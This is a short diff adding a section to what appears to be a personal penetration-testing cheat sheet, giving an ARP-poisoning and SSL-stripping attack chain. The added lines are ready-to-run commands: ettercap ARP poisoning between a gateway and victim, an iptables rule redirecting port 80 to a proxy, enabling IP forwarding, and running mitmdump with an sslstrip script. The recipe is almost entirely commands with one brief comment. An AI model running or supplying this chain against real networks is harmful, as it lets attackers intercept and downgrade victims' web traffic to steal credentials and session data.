@@ -486,7 +486,18 @@ deauth using  mdk4
   * arp.spoof on
   * 
 
+----------------------------------------------------[ARP-POISON+SSL_SRIP]---------------------------------------------
+-->[ARP-Poison]
 
+* ettercap -Tq -M arp:remote -i eth0 -S /192.gateway_ip// //192.victim_ip
+
+[IP-TABLE RULES] -->> any tcp traffic coming to 80 to  8080; so we can we use the proxy and ssl strip 
+*  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080
+m 
+*  echo "1" > /proc/sys/net/ipv4/ip_forward
+
+[RUN PROXY] 
+*  mitmdump -s sslstrip.py -m transparent
 
 ----------------------------------------------------[tracking domain]---------------------------------------------
 
